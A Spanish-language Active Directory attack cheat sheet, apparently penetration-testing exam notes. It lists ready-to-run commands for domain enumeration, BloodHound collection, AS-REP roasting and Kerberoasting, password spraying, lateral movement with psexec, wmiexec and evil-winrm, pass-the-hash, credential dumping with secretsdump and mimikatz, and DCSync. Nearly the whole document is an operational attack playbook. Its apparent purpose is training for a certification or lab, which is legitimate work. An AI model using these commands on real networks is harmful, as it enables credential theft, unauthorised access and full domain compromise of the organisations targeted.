# 6. Active Directory (40 puntos — prioridad alta)

Flujo típico: foothold en máquina 1 → dump de creds → enumerar con BloodHound → Kerberoast/AS-REP → movimiento lateral → DC → DCSync.

## Enumeración con credenciales (aunque sean de bajo privilegio)
```bash
nxc smb <DC_IP> -u <USER> -p <PASS> --users
nxc smb <DC_IP> -u <USER> -p <PASS> --groups
nxc smb <SUBNET>/24 -u <USER> -p <PASS>        # valida/spray en toda la red
nxc smb <DC_IP> -u <USER> -p <PASS> --shares

# Enumeración externa (sin creds)
impacket-rpcclient -U "" -N <IP>
impacket-samrdump <DOMAIN>/<USER>:<PASS>@<IP>
```

## BloodHound (te dibuja el camino a Domain Admin — casi obligatorio)
```bash
# Recolección remota desde Kali
bloodhound-python -u <USER> -p <PASS> -d <DOMAIN> -ns <DC_IP> -c all

# O SharpHound en la máquina Windows comprometida
.\SharpHound.exe -c All
```
Importa el ZIP a BloodHound y mira "Shortest Paths to Domain Admins".

## Ataques Kerberos
```bash
# AS-REP Roasting (usuarios sin preauth) → crackear con hashcat -m 18200
impacket-GetNPUsers <DOMAIN>/ -no-pass -usersfile users.txt -dc-ip <DC_IP>
impacket-GetNPUsers <DOMAIN>/<USER>:<PASS> -request

# Kerberoasting (SPNs) → crackear con hashcat -m 13100
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -request
```

## Password spraying (¡cuidado con lockout!)
```bash
nxc smb <SUBNET>/24 -u users.txt -p 'Password123'
```

## Movimiento lateral (con creds o hash)
```bash
impacket-psexec  <DOMAIN>/<USER>:<PASS>@<IP>
impacket-wmiexec <DOMAIN>/<USER>:<PASS>@<IP>
evil-winrm -i <IP> -u <USER> -p <PASS>

# Pass-the-Hash
impacket-psexec <DOMAIN>/<USER>@<IP> -hashes <LM>:<NT>
evil-winrm -i <IP> -u <USER> -H <NT_HASH>
nxc smb <IP> -u <USER> -H <NT_HASH>
```

## Dump de credenciales
```bash
impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<IP>
nxc smb <IP> -u <USER> -p <PASS> --sam --lsa

# Mimikatz (en la máquina)
sekurlsa::logonpasswords
lsadump::sam
```

## Escalada a Domain Admin
```bash
# DCSync (si tienes derechos de replicación)
impacket-secretsdump -just-dc <DOMAIN>/<USER>:<PASS>@<DC_IP>
```
También: abuso de ACLs (BloodHound), delegaciones, Pass-the-Ticket.

> Recordatorio de reglas: Responder solo en modo análisis, **nunca poisoning**. Metasploit no para pivotar (ver 7-Pivoting).
